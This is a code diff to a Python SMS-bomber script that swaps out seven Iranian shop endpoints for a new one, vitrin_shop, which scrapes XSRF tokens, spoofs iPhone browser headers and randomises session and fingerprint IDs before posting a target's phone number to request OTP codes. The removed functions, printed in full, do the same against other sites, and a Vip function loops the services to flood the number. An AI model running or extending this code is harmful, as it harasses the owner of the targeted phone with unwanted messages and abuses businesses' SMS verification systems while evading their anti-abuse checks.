@@ -53,322 +53,68 @@ def check_internet():
 # SMS Service
 # ------------------------------
 
-
-def mootanroo(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp"
-    
-    payload = {
-        "PhoneNumber": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://mootanroo.com",
-        "Referer": "https://mootanroo.com/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(mootanroo) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (mootanroo) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] mootanroo Exception: {e}{a}')
-        return False
-
-def bodoroj(phone):
+def vitrin_shop(phone):
     import requests
     import re
+    import uuid
     
-    digits_phone = phone.replace("+98", "")
+    formatted_phone = "0" + phone.replace("+98", "")
     
     try:
         session = requests.Session()
-        home_response = session.get("https://bodoroj.com/", timeout=10)
         
-        # استخراج instance_id
-        instance_id = None
-        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
-        match = re.search(instance_pattern, home_response.text)
-        if match:
-            instance_id = match.group(1)
+        # اول صفحه اصلی را برای گرفتن توکن‌ها
+        home_response = session.get("https://www.vitrin.shop/", timeout=10)
         
-        if not instance_id:
-            instance_id = "83143976e95c57bfaa643ec00be89a6a"
+        # استخراج توکن از صفحه (اگر وجود دارد)
+        xsrf_token = None
+        # با الگوهای مختلف توکن را پیدا کن
+        token_patterns = [
+            r'name="_token" value="([^"]+)"',
+            r'XSRF-TOKEN=([^;]+)',
+            r'xsrf-token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
+        ]
         
-        url = "https://bodoroj.com/wp-admin/admin-ajax.php"
+        for pattern in token_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                xsrf_token = match.group(1)
+                break
         
-        # استفاده از پارامترهای کامل
+        url = "https://www.vitrin.shop/api/v1/user/request_code"
+        
         payload = {
-            "login_digt_countrycode": "+98",
-            "digits_phone": digits_phone,
-            "digits_email": "",
-            "action_type": "phone",
-            "digits_reg_name": "نام",
-            "digits_process_register": "1",
-            "sms_otp": "",
-            "otp_step_1": "1",
-            "digits_otp_field": "1",
-            "rememberme": "1",
-            "digits": "1",
-            "instance_id": instance_id,
-            "action": "digits_forms_ajax",
-            "type": "login",
-            "digits_redirect_page": "//bodoroj.com/?page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
-            "digits_form": "fa139d7ce8",
-            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
-            "show_force_title": "1",
-            "container": "digits_protected",
-            "sub_action": "sms_otp"
+            "phone_number": formatted_phone,
+            "forgot_password": False
         }
         
         headers = {
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://bodoroj.com",
-            "Referer": "https://bodoroj.com/",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "V-Session-ID": str(uuid.uuid4()),
+            "V-Fingerprint-ID": str(uuid.uuid4()),  # جدید каждый بار
+            "X-XSRF-TOKEN": xsrf_token if xsrf_token else "eyJpdiI6InNpQ0Q5TGdWVGs2Vkp2U2JQcG93NUE9PSIsInZhbHVlIjoiSmpSNmpvdnBQM2VtbE5DajU2aU5IdWlFRW5NQzVoTWZkeENRQ2dWUlhta3RRbkVmeU5LRGc5NFV6eDd6QTdkb3lEUkhQbk9jdGJrTDFSWmx3TmhxWC9JRVc5Y2JPU0p4NFg2OTRSK3grT0NsWFBHZExGMkNTUDhDWEkzcjhkVnUiLCJtYWMiOiJjZjk3NjAzNDkzMDBiMDYxMmI0NDI2NTNlZDBhNzg5NDQ5NzNjN2M4ODkyN2NjMDBjNjE5NDdiY2Q0MzlkYjNiIiwidGFnIjoiIn0=",
+            "Origin": "https://www.vitrin.shop",
+            "Referer": "https://www.vitrin.shop/",
         }
         
-        response = session.post(url, data=payload, headers=headers, timeout=10)
+        response = session.post(url, json=payload, headers=headers, timeout=10)
         
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
         
         if response.status_code == 200:
-            try:
-                response_data = response.json()
-                if response_data.get("success") is True:
-                    print(f'{g}(bodoroj) {a}Code Sent')
-                    return True
-            except:
-                if response.text.strip() == "1":
-                    print(f'{g}(bodoroj) {a}Code Sent')
-                    return True
-        
-        print(f'{r}[-] (bodoroj) Failed{a}')
-        return False
-            
-    except Exception as e:
-        print(f'{r}[!] bodoroj Exception: {e}{a}')
-        return False
-
-
-def riiha(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://www.riiha.ir/api/v1.0/authenticate"
-    
-    payload = {
-        "mobile": formatted_phone,
-        "mobile_code": "",
-        "type": "mobile"
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://www.riiha.ir",
-        "Referer": "https://www.riiha.ir/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(riiha) {a}Code Sent')
+            print(f'{g}(vitrin_shop) {a}Code Sent')
             return True
         else:
-            print(f'{r}[-] (riiha) HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] riiha Exception: {e}{a}')
+        print(f'{r}[!] vitrin_shop Exception: {e}{a}')
         return False
-
-
-def niktakala(phone):
-    import requests
-    import uuid
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://niktakala.com/backend/customer/v2/otp-send/s/"
-    
-    payload = {
-        "phone_number": formatted_phone,
-        "is_forget_password": False
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "X-Customer-Signature": str(uuid.uuid4()),
-        "accept-language": "fa-IR",
-        "Origin": "https://niktakala.com",
-        "Referer": "https://niktakala.com/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(niktakala) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (niktakala) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] niktakala Exception: {e}{a}')
-        return False
-        
-def payonshoes(phone):
-    import requests
-    import re
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    
-    try:
-        session = requests.Session()
-        home_response = session.get("https://payonshoes.com/", timeout=10)
-        
-        # استخراج CSRF_TOKEN
-        csrf_token = None
-        csrf_patterns = [
-            r'name="csrf" value="([a-f0-9]+)"',
-            r'name="dig_nounce" value="([a-f0-9]+)"'
-        ]
-        
-        for pattern in csrf_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                csrf_token = match.group(1)
-                break
-        
-        if not csrf_token:
-            csrf_token = "11d30be44d"
-        
-        url = "https://payonshoes.com/wp-admin/admin-ajax.php"
-        
-        payload = {
-            "action": "digits_check_mob",
-            "countrycode": "+98",
-            "mobileNo": formatted_phone,  # با صفر
-            "csrf": csrf_token,
-            "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
-            "json": "1",
-            "whatsapp": "0"
-        }
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://payonshoes.com",
-            "Referer": "https://payonshoes.com/",
-        }
-        
-        response = session.post(url, data=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            if response.text.strip() == "1":
-                print(f'{g}(payonshoes) {a}Code Sent')
-                return True
-        
-        print(f'{r}[-] (payonshoes) Failed{a}')
-        return False
-            
-    except Exception:
-        print(f'{r}[-] (payonshoes) Failed{a}')
-        return False
-
-
-def mobilex(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://backend.mobilex.ir/api/v1/user/login/otp"
-    
-    payload = {
-        "mobile": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://mobilex.ir",
-        "Referer": "https://mobilex.ir/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(mobilex) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (mobilex) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] mobilex Exception: {e}{a}')
-        return False
-
-
-def alldigitall(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://api.alldigitall.ir/v1/auth/register?store_id=0"
-    
-    payload = {
-        "firstname": "نام",
-        "lastname": "خانوادگی", 
-        "mobile": formatted_phone,
-        "password": "12345678",
-        "password_confirmation": "12345678"
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "Origin": "https://alldigitall.ir",
-        "Referer": "https://alldigitall.ir/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            print(f'{g}(alldigitall) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (alldigitall) HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] alldigitall Exception: {e}{a}')
-        return False
-
+ 
 
 # ------------------------------
 # SMS Bomber
@@ -384,13 +130,7 @@ def send_service_safe(service, phone):
         
 def Vip(phone, Time):
     services = [
-    alldigitall,
-    mobilex,
-    payonshoes,
-    niktakala,
-    mootanroo,
-    bodoroj,
-    riiha,  # سرویس جدید
+    vitrin_shop,  # سرویس جدید
 ]
     total_services = len(services)
 
